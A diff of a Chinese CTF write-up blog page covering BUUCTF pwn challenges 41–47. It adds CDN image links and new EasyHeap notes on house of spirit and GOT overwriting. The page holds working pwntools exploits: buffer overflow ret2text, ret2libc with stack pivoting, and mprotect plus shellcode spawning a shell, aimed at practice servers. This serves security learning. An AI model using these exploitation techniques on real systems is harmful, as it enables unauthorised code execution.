@@ -23,39 +23,49 @@
 <meta property="og:site_name" content="Dreaming">
 <meta property="og:description" content="41.picoctf_2018_buffer overflow 1ret2text (1)分析 main  vuln  gets漏洞 win  这里就读出flag了 (2)payload12345678910111213from pwn import *context(log_level&#x3D;&amp;#x27;debug&amp;#x27;,arch&#x3D;&amp;#x27;i386&amp;#x27;,os&#x3D;&amp;#x27;linux&amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143121323.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143448166.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143520072.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011161726472.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143138943.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143204092.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011163306913.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011163327742.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011172348440.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011203955743.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143335686.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012083505794.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012100240612.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012100429085.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012200657835.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231011143354723.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012105117110.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012110054158.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012110134281.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012110030347.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012105138265.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012203912182.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012203948137.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012204031710.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012105153324.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012105215869.png">
-<meta property="og:image" content="http://example.com/images/41-50/image-20231012105233326.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143121323.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143448166.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143520072.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011161726472.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143138943.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408155054479.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408154845470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143204092.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163306913.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163327742.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011172348440.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011203955743.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143335686.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012083505794.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100240612.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100429085.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012200657835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143354723.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105117110.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110054158.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110134281.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110030347.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105138265.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203912182.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203948137.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012204031710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105153324.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141423542.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141452804.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141520555.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105215869.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084106789.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084132586.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019085340130.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105233326.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093628174.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019093710374.png">
 <meta property="article:published_time" content="2023-10-11T01:34:28.000Z">
-<meta property="article:modified_time" content="2023-10-13T01:45:32.597Z">
+<meta property="article:modified_time" content="2024-04-18T08:44:29.472Z">
 <meta property="article:author" content="Jwj-Learning">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/41-50/image-20231011143121323.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143121323.png">
   
   
   
@@ -248,7 +258,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.8k 字
+          8.3k 字
         
       </span>
     
@@ -259,7 +269,7 @@
         
         
         
-          57 分钟
+          70 分钟
         
       </span>
     
@@ -302,50 +312,60 @@
               <div class="markdown-body">
                 
                 <h1 id="41-picoctf-2018-buffer-overflow-1"><a href="#41-picoctf-2018-buffer-overflow-1" class="headerlink" title="41.picoctf_2018_buffer overflow 1"></a>41.picoctf_2018_buffer overflow 1</h1><p>ret2text</p>
-<h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231011143121323.png" srcset="/img/loading.gif" lazyload alt="image-20231011143121323"></p>
+<h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143121323.png" srcset="/img/loading.gif" lazyload alt="image-20231011143121323"></p>
 <p>main</p>
-<p><img src="/../../../images/41-50/image-20231011143448166.png" srcset="/img/loading.gif" lazyload alt="image-20231011143448166"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143448166.png" srcset="/img/loading.gif" lazyload alt="image-20231011143448166"></p>
 <p>vuln</p>
-<p><img src="/../../../images/41-50/image-20231011143520072.png" srcset="/img/loading.gif" lazyload alt="image-20231011143520072"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143520072.png" srcset="/img/loading.gif" lazyload alt="image-20231011143520072"></p>
 <p>gets漏洞</p>
 <p>win</p>
-<p><img src="/../../../images/41-50/image-20231011161726472.png" srcset="/img/loading.gif" lazyload alt="image-20231011161726472"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011161726472.png" srcset="/img/loading.gif" lazyload alt="image-20231011161726472"></p>
 <p>这里就读出flag了</p>
 <h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27142</span>)<br><br>win_addr=<span class="hljs-number">0x80485cb</span><br>padding=<span class="hljs-number">0x2c</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(win_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Please enter your string:&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="42-ZJCTF-2019-EasyHeap"><a href="#42-ZJCTF-2019-EasyHeap" class="headerlink" title="42.[ZJCTF 2019]EasyHeap"></a>42.[ZJCTF 2019]EasyHeap</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231011143138943.png" srcset="/img/loading.gif" lazyload alt="image-20231011143138943"></p>
+<h1 id="42-ZJCTF-2019-EasyHeap"><a href="#42-ZJCTF-2019-EasyHeap" class="headerlink" title="42.[ZJCTF 2019]EasyHeap"></a>42.[ZJCTF 2019]EasyHeap</h1><p>house of spirit</p>
+<h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143138943.png" srcset="/img/loading.gif" lazyload alt="image-20231011143138943"></p>
 <p>main</p>
+<p>delete_heap</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408155054479.png" srcset="/img/loading.gif" lazyload alt="image-20240408155054479"></p>
+<p>l33t</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240408154845470.png" srcset="/img/loading.gif" lazyload alt="image-20240408154845470"></p>
+<p>后门函数</p>
+<p>用程序定义的 read_input 来修改某个地址的内容，从而劫持程序执行，在上面调用 read_input 的地方可知，写入的地址是一个chunk的首地址，也就是说如果能修改 chunk 首地址为指定的位置，就能实现任意地址写了。</p>
+<p>create那的话 chunk大小没限制，可惜这里没有输出功能不然利用mmap的特性直接泄露libc也是可以的，如果还是想的话配合劫持stdout也可以，只不过过于麻烦</p>
+<p>覆盖调用函数，把free的got表掉包成system的plt表，不就可以执行system（堆指针）了吗？那么此时如果堆指针存着‘&#x2F;bin&#x2F;sh’，我们就可以执行system（‘&#x2F;bin&#x2F;sh’）提权了。（注意字符串实际上就是一个指针，并且结尾是‘\x00’）</p>
 <h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
 
+<p>PS:靶机的glibc版本是2.23的。 2.26版本之后加入了 tcache 机制，就没办法用常见的 fastbin 攻击。</p>
 <h1 id="43-Black-Watch-入群题-PWN"><a href="#43-Black-Watch-入群题-PWN" class="headerlink" title="43.[Black Watch 入群题]PWN"></a>43.[Black Watch 入群题]PWN</h1><p>ret2libc+栈劫持</p>
-<h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231011143204092.png" srcset="/img/loading.gif" lazyload alt="image-20231011143204092"></p>
+<h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143204092.png" srcset="/img/loading.gif" lazyload alt="image-20231011143204092"></p>
 <p>main</p>
-<p><img src="/../../../images/41-50/image-20231011163306913.png" srcset="/img/loading.gif" lazyload alt="image-20231011163306913"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163306913.png" srcset="/img/loading.gif" lazyload alt="image-20231011163306913"></p>
 <p>vul_function</p>
-<p><img src="/../../../images/41-50/image-20231011163327742.png" srcset="/img/loading.gif" lazyload alt="image-20231011163327742"></p>
-<p><img src="/../../../images/41-50/image-20231011172348440.png" srcset="/img/loading.gif" lazyload alt="image-20231011172348440"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163327742.png" srcset="/img/loading.gif" lazyload alt="image-20231011163327742"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011172348440.png" srcset="/img/loading.gif" lazyload alt="image-20231011172348440"></p>
 <p>发现s在bss段上</p>
 <p>分析一下这个函数，一开始输出m1里的字符串，然后调用read函数给s写入不大于0x200长度的数据，然后又是一个read函数，让我们读入0x20长度的数据给参数buf，buf参数的大小是0x18，我们可以溢出0x8字节，0x8字节，只够我们覆盖ret，没办法构造很长的rop链来攻击，所以需要将栈迁移到s中拿到shell。</p>
 <p>所以我们将ROP链布置在那里，由于这题需要我们自己构造system(‘&#x2F;bin&#x2F;sh’)</p>
 <p>需要先来泄露一下程序的libc版本,那么本题payload构造思路就清晰了，ret2libc+栈劫持的组合</p>
-<p><img src="/../../../images/41-50/image-20231011203955743.png" srcset="/img/loading.gif" lazyload alt="image-20231011203955743"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011203955743.png" srcset="/img/loading.gif" lazyload alt="image-20231011203955743"></p>
 <h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29859</span>)<br><span class="hljs-comment">#io=process(&#x27;./43&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./43&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]	<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x18</span>	<span class="hljs-comment">#偏移地址（这个不包含函数返回地址，只是栈大小）</span><br>s=<span class="hljs-number">0x0804A300</span><br>leave_ret=<span class="hljs-number">0x08048408</span><br><br>payload = p32(write_plt)+p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br>io.recvuntil(<span class="hljs-string">b&quot;What is your name?&quot;</span>)<br>io.send(payload)<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p32(s-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>io.recvuntil(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>io.send(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>io.sendline(payload2)<br><br>io.recvuntil(<span class="hljs-string">&quot;say?&quot;</span>)<br>io.sendline(payload1)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <h1 id="44-inndy-rop"><a href="#44-inndy-rop" class="headerlink" title="44.inndy_rop"></a>44.inndy_rop</h1><p>ret2shellcode</p>
-<h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231011143335686.png" srcset="/img/loading.gif" lazyload alt="image-20231011143335686"></p>
+<h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143335686.png" srcset="/img/loading.gif" lazyload alt="image-20231011143335686"></p>
 <p>main</p>
-<p><img src="/../../../images/41-50/image-20231012083505794.png" srcset="/img/loading.gif" lazyload alt="image-20231012083505794"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012083505794.png" srcset="/img/loading.gif" lazyload alt="image-20231012083505794"></p>
 <p>overflow</p>
-<p><img src="/../../../images/41-50/image-20231012100240612.png" srcset="/img/loading.gif" lazyload alt="image-20231012100240612"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100240612.png" srcset="/img/loading.gif" lazyload alt="image-20231012100240612"></p>
 <p>gets溢出漏洞</p>
 <h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>发现程序中函数很多，应该是静态编译<br>查看有没有mprotect函数</p>
-<p><img src="/../../../images/41-50/image-20231012100429085.png" srcset="/img/loading.gif" lazyload alt="image-20231012100429085"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100429085.png" srcset="/img/loading.gif" lazyload alt="image-20231012100429085"></p>
 <p>果然有，那么我们可以用这个函数改bss段权限来执行shellcode</p>
 <h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>可以直接利用ROPgadget工具来构造ROP链</p>
 <blockquote>
 <p>ROPgadget –binary 44 –ropchain</p>
 </blockquote>
-<p><img src="/../../../images/41-50/image-20231012200657835.png" srcset="/img/loading.gif" lazyload alt="image-20231012200657835"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012200657835.png" srcset="/img/loading.gif" lazyload alt="image-20231012200657835"></p>
 <h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>exp1</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29581)</span><br>io = process(<span class="hljs-string">&#x27;./44&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./44&#x27;</span>)<br><br>padding = <span class="hljs-number">0xc</span>+<span class="hljs-number">4</span><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_start = elf.bss() &amp; <span class="hljs-number">0xfffff000</span>  <span class="hljs-comment"># 页对齐</span><br>bss_size = <span class="hljs-number">0x1000</span><br>rwx = <span class="hljs-number">7</span><br>pop_3times_ret = <span class="hljs-number">0x0806ecd8</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding, mprotect_addr, pop_3times_ret, bss_start,bss_size, rwx, read_addr, bss_start, <span class="hljs-number">0</span>, bss_start, bss_size])<br><br>io.sendline(payload)<br>gdb.attach(io)<br>shellcode = asm(shellcraft.sh())<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -356,29 +376,29 @@
 
 
 
-<h1 id="45-hitcontraining-uaf"><a href="#45-hitcontraining-uaf" class="headerlink" title="45.hitcontraining_uaf"></a>45.hitcontraining_uaf</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231011143354723.png" srcset="/img/loading.gif" lazyload alt="image-20231011143354723"></p>
+<h1 id="45-hitcontraining-uaf"><a href="#45-hitcontraining-uaf" class="headerlink" title="45.hitcontraining_uaf"></a>45.hitcontraining_uaf</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143354723.png" srcset="/img/loading.gif" lazyload alt="image-20231011143354723"></p>
 <h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
 
 <h1 id="46-jarvisoj-test-your-memory"><a href="#46-jarvisoj-test-your-memory" class="headerlink" title="46.jarvisoj_test_your_memory"></a>46.jarvisoj_test_your_memory</h1><p>ret2text</p>
-<h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231012105117110.png" srcset="/img/loading.gif" lazyload alt="image-20231012105117110"></p>
+<h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105117110.png" srcset="/img/loading.gif" lazyload alt="image-20231012105117110"></p>
 <p>main</p>
-<p><img src="/../../../images/41-50/image-20231012110054158.png" srcset="/img/loading.gif" lazyload alt="image-20231012110054158"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110054158.png" srcset="/img/loading.gif" lazyload alt="image-20231012110054158"></p>
 <p>mem_test</p>
-<p><img src="/../../../images/41-50/image-20231012110134281.png" srcset="/img/loading.gif" lazyload alt="image-20231012110134281"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110134281.png" srcset="/img/loading.gif" lazyload alt="image-20231012110134281"></p>
 <p>__isoc99_scanf溢出漏洞<br>同时发现hint存放着cat flag命令</p>
 <p>win_func</p>
-<p><img src="/../../../images/41-50/image-20231012110030347.png" srcset="/img/loading.gif" lazyload alt="image-20231012110030347"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110030347.png" srcset="/img/loading.gif" lazyload alt="image-20231012110030347"></p>
 <p>给了system函数，我们需要将hint作为system函数的参数，来获取flag，注意返回地址要选一个空地址，不能让程序崩溃，不然不会显示flag</p>
 <h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29129</span>)<br>elf = ELF(<span class="hljs-string">&quot;./46&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>flag_addr = <span class="hljs-number">0x80487E0</span><br>system_addr = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>+<span class="hljs-number">4</span>) + p32(system_addr) + p32(<span class="hljs-number">0x8048790</span>) + p32(flag_addr)	<span class="hljs-comment">#只要地址显示的伪代码为空就可以用</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="47-cmcc-simplerop"><a href="#47-cmcc-simplerop" class="headerlink" title="47.cmcc_simplerop"></a>47.cmcc_simplerop</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="/../../../images/41-50/image-20231012105138265.png" srcset="/img/loading.gif" lazyload alt="image-20231012105138265"></p>
+<h1 id="47-cmcc-simplerop"><a href="#47-cmcc-simplerop" class="headerlink" title="47.cmcc_simplerop"></a>47.cmcc_simplerop</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105138265.png" srcset="/img/loading.gif" lazyload alt="image-20231012105138265"></p>
 <p>main</p>
